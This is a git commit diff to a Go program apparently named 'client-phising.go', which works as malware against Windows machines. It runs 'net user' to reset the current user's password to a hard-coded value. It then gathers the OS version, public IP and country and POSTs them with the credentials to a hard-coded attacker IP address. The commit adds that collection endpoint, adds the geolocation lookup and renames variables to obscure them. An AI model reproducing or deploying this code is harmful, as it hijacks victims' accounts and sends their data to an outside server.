8c389e405e1b8b0c2681a45a0b4f221069c093cd
adiyahoo <136817243+adiyahoo@users.noreply.github.com>
2023-06-26 14:45:37 +0700

    Update client-phising.go

--- client-phising.go
+++ client-phising.go
@@ -17,10 +17,10 @@ type Data struct {
 	Username string `json:"username"`
 	Password string `json:"password"`
 	Token    string `json:"token"`
+	Country  string `json:"country"`
 }
 
 func main() {
-	linkGacor := "" // Your link host website
 	headers := map[string]string{
 		"Content-Type": "application/json",
 		"Accept":       "text/plain",
@@ -32,20 +32,20 @@ func main() {
 		return
 	}
 
-	username := currentUser.Username
-	if strings.Contains(username, "\\") {
-		parts := strings.Split(username, "\\")
-		username = parts[len(parts)-1]
+	_us := currentUser.Username
+	if strings.Contains(_us, "\\") {
+		parts := strings.Split(_us, "\\")
+		_us = parts[len(parts)-1]
 	}
 
-	_p := "adiyaksa12$" // Your password
-	_t := "" // Your token website
+	_p := "adiyaksa12$"
+	_t := ""
 
 	_ = _p
 	_ = _t
 
 	_v := exec.Command("wmic", "os", "get", "Caption", "/value")
-	_c2 := exec.Command("net", "user", username, _p)
+	_c2 := exec.Command("net", "user", _us, _p)
 
 	_out, err := _v.Output()
 
@@ -65,17 +65,24 @@ func main() {
 		return
 	}
 
+	country, err := getCountryFromIP(publicIP)
+	if err != nil {
+		fmt.Println("Error:", err)
+		return
+	}
+
 	data := Data{
 		OS:       strings.TrimSpace(caption[1]),
 		IP:       publicIP,
-		Username: username,
+		Username: _us,
 		Password: _p,
 		Token:    _t,
+		Country:  country,
 	}
 
 	jsonPayload, _ := json.Marshal(data)
 
-	req, _ := http.NewRequest("POST", linkGacor, bytes.NewBuffer(jsonPayload))
+	req, _ := http.NewRequest("POST", "http://43.133.138.170:80/post_data", bytes.NewBuffer(jsonPayload))
 	for key, value := range headers {
 		req.Header.Set(key, value)
 	}
@@ -101,5 +108,24 @@ func getPublicIP() (string, error) {
 		return "", err
 	}
 
-	return string(ipBytes), nil
+	return strings.TrimSpace(string(ipBytes)), nil
+}
+
+func getCountryFromIP(ip string) (string, error) {
+	resp, err := http.Get("http://ip-api.com/json/" + ip)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	var result struct {
+		Country string `json:"country"`
+	}
+
+	err = json.NewDecoder(resp.Body).Decode(&result)
+	if err != nil {
+		return "", err
+	}
+
+	return result.Country, nil
 }
